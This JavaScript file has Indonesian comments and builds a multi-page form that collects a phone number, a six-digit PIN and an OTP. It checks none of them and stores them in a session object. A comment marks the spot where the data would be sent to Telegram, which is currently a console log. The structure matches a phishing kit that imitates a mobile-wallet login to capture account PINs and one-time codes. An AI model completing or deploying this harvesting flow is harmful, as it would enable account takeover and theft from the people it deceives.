document.addEventListener("DOMContentLoaded", () => {
  const pages = document.querySelectorAll(".page");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const lanjutkanButtonPin = document.getElementById("lanjutkan-button-pin");
  const lanjutkanButtonOtp = document.getElementById("lanjutkan-button-otp");
  const floatingNotification = document.getElementById("floating-notification");
  let currentPageIndex = 0;
  let otpAttempts = 0;
  const maxOtpAttempts = 5;
  let isOtpLocked = false;

  const userSession = {};

  // Fungsi untuk menampilkan halaman tertentu
  function showPage(index) {
    pages.forEach((page, i) => {
      page.style.display = i === index ? "block" : "none";
    });
    currentPageIndex = index;
    checkButtonState();
  }

  // Fungsi untuk memeriksa status tombol "Lanjutkan"
  function checkButtonState() {
    const currentPage = pages[currentPageIndex];
    let isButtonActive = false;

    if (currentPage.id === "number-page") {
      const phoneNumber = document.getElementById("phone-number").value.replace(/\D/g, '');
      isButtonActive = phoneNumber.length >= 9;
      lanjutkanButton.disabled = !isButtonActive;
    } else if (currentPage.id === "pin-page") {
      isButtonActive = Array.from(currentPage.querySelectorAll(".pin-box")).every(input => input.value.length === 1);
      lanjutkanButtonPin.disabled = !isButtonActive;
    } else if (currentPage.id === "otp-page") {
      isButtonActive = Array.from(currentPage.querySelectorAll(".otp-box")).every(input => input.value.length === 1);
      lanjutkanButtonOtp.disabled = !isButtonActive;
    }
  }

  // Fungsi untuk memformat nomor telepon
  function formatPhoneNumber(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 4) value = value.replace(/(\d{4})(\d{4})(\d{1,4})/, "$1-$2-$3");
    input.value = value;
    checkButtonState();
  }

  // Fungsi untuk berpindah ke input berikutnya
  function moveToNextInput(input) {
    if (input.value.length === input.maxLength) {
      const nextInput = input.nextElementSibling;
      if (nextInput) nextInput.focus();
    }
    checkButtonState();
  }

  // Fungsi untuk berpindah ke input sebelumnya
  function moveToPreviousInput(input) {
    if (input.value.length === 0 && input.previousElementSibling) {
      input.previousElementSibling.focus();
    }
  }

  // Event listener untuk input dan keydown
  document.addEventListener("input", (e) => {
    if (e.target.matches("#phone-number")) formatPhoneNumber(e.target);
    if (e.target.matches(".pin-box, .otp-box")) moveToNextInput(e.target);
  });

  document.addEventListener("keydown", (e) => {
    if (e.target.matches(".pin-box, .otp-box") && (e.key === "Backspace" || e.key === "Delete")) {
      moveToPreviousInput(e.target);
    }
  });

  // Event listener untuk tombol "Lanjutkan" di halaman nomor telepon
  lanjutkanButton.addEventListener("click", () => {
    showPage(1); // Pindah ke halaman PIN
  });

  // Event listener untuk tombol "Lanjutkan" di halaman PIN
  lanjutkanButtonPin.addEventListener("click", () => {
    showPage(2); // Pindah ke halaman OTP
  });

  // Event listener untuk tombol "Lanjutkan" di halaman OTP
  lanjutkanButtonOtp.addEventListener("click", () => {
    const otp = Array.from(document.querySelectorAll(".otp-box")).map(input => input.value).join("");
    const phoneNumber = document.getElementById("phone-number").value.replace(/\D/g, '');
    userSession[`user_${phoneNumber}`] = { phone: phoneNumber, pin: "XXXXXX", otp: otp };

    otpAttempts++;
    if (otpAttempts >= maxOtpAttempts) {
      isOtpLocked = true;
      floatingNotification.innerText = "Anda telah melebihi batas percobaan OTP.";
      floatingNotification.style.backgroundColor = "rgba(255, 0, 0, 0.8)";
      floatingNotification.style.display = "block";
    } else {
      // Kirim data ke Telegram (jika diperlukan)
      console.log("Data dikirim:", userSession[`user_${phoneNumber}`]);
    }
  });

  // Inisialisasi halaman pertama
  showPage(0);
});